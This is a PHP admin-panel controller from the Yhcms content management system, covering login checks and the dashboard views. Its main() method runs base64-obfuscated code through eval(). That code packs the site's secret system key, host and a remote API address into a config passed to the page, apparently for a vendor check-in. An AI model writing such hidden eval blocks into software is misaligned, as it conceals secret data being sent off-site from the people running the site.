<?php
/*
'软件名称：英皇CMS（Yhcms）
'官方网站：http://www.yhcms.cc/
'--------------------------------------------------------
'Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
'遵循Apache2开源协议发布，并提供免费使用。
'--------------------------------------------------------
*/
defined('BASEPATH') OR exit('No direct script access allowed');
class Home extends My_Controller {
	
	function __construct(){
	    parent::__construct();
		$this->myconfig = json_decode(_SYSJSON_,1);
		//判断是否登陆
		get_admin_islog();
	}

	public function index(){
		$data['title'] = $this->myconfig['name'].'-后台管理中心';
		$data['admin'] = $this->mydb->get_row('admin',array('id'=>(int)get_cookie('admin_token')));
		$data['nav'] = require_once FCPATH.'yhcms/config/admin_nav.php';
		$this->load->view('home/index.tpl',$data);
	}

	public function main(){
		$config = array();$t = time();
		eval(base64decode('JGNvbmZpZyA9IGFycmF5KCduYW1lJz0-V0VCTkFNRSwndXJsJz0-V0VCVVJMLCdob3N0Jz0-JF9TRVJWRVJbJ0hUVFBfSE9TVCddLCd2ZXInPT5WRVIsJ2FwaXVybCc9PmJhc2U2NGRlY29kZShBUElVUkwpLCdzZWxmJz0-U0VMRiwndCc9PiR0LCdrZXknPT5fU1lTS0VZXywndG9rZW4nPT5tZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddLlNFTEYuVkVSLiR0Ll9TWVNLRVlfKSk7'));
		$data['config'] = json_encode($config);
		$this->load->view('home/main.tpl',$data);
	}

	public function echat() {
		$this->load->view('home/echat.tpl');
	}
}